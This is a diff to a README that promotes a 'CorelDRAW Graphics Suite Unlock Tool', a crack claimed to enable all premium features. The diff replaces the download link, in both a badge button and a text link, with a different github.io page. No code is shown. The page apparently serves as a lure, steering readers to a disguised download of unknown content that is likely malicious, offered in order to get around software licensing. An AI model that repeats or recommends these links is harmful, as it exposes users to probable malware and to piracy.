@@ -6,7 +6,7 @@
 <h1 align="center">⚡ CorelDRAW Graphics Suite Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/301" target="_blank">
+  <a href="https://coreldrawload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20CorelDRAW%20Unlock%20Tool-Enable%20All%20Features-FF6600?style=for-the-badge&logo=coreldraw&logoColor=white" 
          alt="Download CorelDRAW Graphics Suite Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -96,7 +96,7 @@ Found an issue or want to contribute? Open an issue or submit a pull request.
 ## ⭐ Unlock CorelDRAW Graphics Suite – Professional Vector Design and Illustration
 
 Unlock all premium features of CorelDRAW Graphics Suite.  
-[Download the Unlock Tool](https://hiopal3847.github.io/.github/301) and elevate your design workflow.
+[Download the Unlock Tool](https://coreldrawload.github.io/.github/) and elevate your design workflow.
 
 ---
 
